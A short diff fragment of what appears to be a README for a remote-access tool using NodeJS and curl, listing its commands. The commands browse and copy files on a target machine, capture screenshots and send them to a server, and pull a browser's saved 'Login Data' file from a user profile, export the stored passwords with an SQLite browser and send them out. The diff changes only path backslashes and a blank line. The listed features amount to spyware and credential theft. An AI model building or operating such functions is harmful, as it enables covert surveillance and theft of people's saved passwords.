@@ -12,10 +12,11 @@ Read file curl-7.45.0\winbuild\BUILD.WINDOWS.txt for more information
 
 
 # NodeJS command
-1. ls C:\folder\[1]\[5]		    :   List all file/folder
-2. cp C:\folder\[1]\file.txt        :   Copy file
+1. ls C:\folder\\[1]\[5]		    :   List all file/folder
+2. cp C:\folder\\[1]\file.txt        :   Copy file
 3. screenshot               	    :	   Capture screenshot and sent to server
 4. decrypt                  	    :	Decrypt chrome login data C:\Users\Admin\AppData\Local\CocCoc\Browser\User Data\Default\Login Data
+
       4.1 Download Login Data file
       4.2 Export password using "DB Browser for SQL Lite" to file
       4.3 Send file
